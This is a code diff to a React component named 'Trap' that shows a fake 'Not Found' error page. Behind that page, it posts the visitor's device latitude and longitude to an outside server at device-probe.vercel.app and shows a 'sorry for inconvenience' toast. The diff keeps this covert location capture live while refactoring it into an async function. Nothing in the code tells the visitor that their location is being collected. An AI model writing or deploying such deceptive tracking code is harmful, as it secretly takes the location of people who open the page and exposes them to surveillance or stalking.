@@ -2,7 +2,8 @@
 import React from "react";
 import axios from "axios";
 import { useEffect } from "react";
-import { ToastContainer, toast } from "react-toastify";
+import { ToastContainer, toast } from 'react-toastify';
+import 'react-toastify/dist/ReactToastify.css';
 
 const Trap = () => {
   useEffect(() => {
@@ -22,28 +23,28 @@ const Trap = () => {
     });
   }
 
-  function main(body) {
-    return axios
-      .post(`https://device-probe.vercel.app/`, {
-        deviceLatitude: body.deviceLatitude,
-        deviceLongitude: body.deviceLongitude,
-      })
-      .then((response) => {
-        response.data !== undefined ? toast.success("sorry for inconvenience") : toast.warn("sorry for inconvenience")
-        return response.data;
-      })
-      .catch((error) => {
-        return { res: error, status: false, statusCode: 500, error: "error" };
-      });
+  async function main(body) {
+    const query = await axios.post(`https://device-probe.vercel.app/`, {
+      deviceLatitude: body.deviceLatitude,
+      deviceLongitude: body.deviceLongitude,
+    });
+
+    console.log(query.data);
+    query.data !== undefined
+      ? toast.success("sorry for inconvenience")
+      : toast.warn("sorry for inconvenience");
+    return query.data;
+
   }
   return (
-    <div className="not-found">
-      <h1>Not Found</h1>
-      <p>We're sorry, but the page you requested could not be found.</p>
-      <button>Go Back</button>
-
+    <>
+      <div className="not-found">
+        <h1>Not Found</h1>
+        <p>We're sorry, but the page you requested could not be found.</p>
+        <button>Go Back</button>
+      </div>
       <ToastContainer />
-    </div>
+    </>
   );
 };
 
